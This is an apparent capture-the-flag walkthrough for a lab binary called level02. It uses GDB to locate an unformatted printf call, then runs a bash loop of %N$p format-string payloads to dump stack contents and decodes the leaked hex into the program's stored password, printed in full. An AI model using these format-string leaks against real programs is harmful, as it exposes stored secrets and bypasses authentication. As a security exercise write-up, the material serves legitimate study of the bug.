
# Level02 - Exploiting Format String Vulnerability to Retrieve Hidden Password

## Step 1: Running the Program

First, let's run the program to observe its behavior:

```bash
$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: coucou
--[ Password: coucou
*****************************************
coucou does not have access!
```

The program prompts for a username and password, then denies access with a message.

## Step 2: Analyzing with GDB

To understand the program, let's analyze it using GDB (GNU Debugger). The disassembly shows the presence of `fopen` and `fread` functions used to read a password file. More importantly, there's a critical format string vulnerability in the `printf` function:

```assembly
0x0000000000400a96 <+642>: lea    rax,[rbp-0x70]
0x0000000000400a9a <+646>: mov    rdi,rax
0x0000000000400a9d <+649>: mov    eax,0x0
0x0000000000400aa2 <+654>: call   0x4006c0 <printf@plt>
```

The `printf` call directly uses a variable without proper formatting, leading to a format string vulnerability.

## Step 3: Exploiting the Format String

Using the vulnerability, we can print the stack content. The following command tests different stack positions to reveal interesting information:

```bash
$ for(( i = 1; i < 42; i++)); do echo "$i - %$i\$p" | ./level02 | grep does; done
```

Notable stack outputs appear at positions 22 to 26, showing hexadecimal strings that resemble encoded data:

```
22 - 0x756e505234376848 does not have access!
23 - 0x45414a3561733951 does not have access!
24 - 0x377a7143574e6758 does not have access!
25 - 0x354a35686e475873 does not have access!
26 - 0x48336750664b394d does not have access!
```

## Step 4: Converting Hex Strings to Characters

Convert these hexadecimal strings into readable ASCII text using Python:

```bash
$ python -c 'print "756e505234376848".decode("hex")[::-1]'
Hh74RPnu
$ python -c 'print "45414a3561733951".decode("hex")[::-1]'
Q9sa5JAE
$ python -c 'print "377a7143574e6758".decode("hex")[::-1]'
XgNWCqz7
$ python -c 'print "354a35686e475873".decode("hex")[::-1]'
sXGnh5J5
$ python -c 'print "48336750664b394d".decode("hex")[::-1]'
M9KfPg3H
```

Combine all the decoded strings to form the password:

`Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

## Summary

- The program has a format string vulnerability that allows printing stack data.
- Interesting data found in the stack positions can be decoded to retrieve a hidden password.
- The retrieved password is used to gain access, bypassing the login checks.

This approach demonstrates how to exploit format string vulnerabilities to extract sensitive information from a running program.
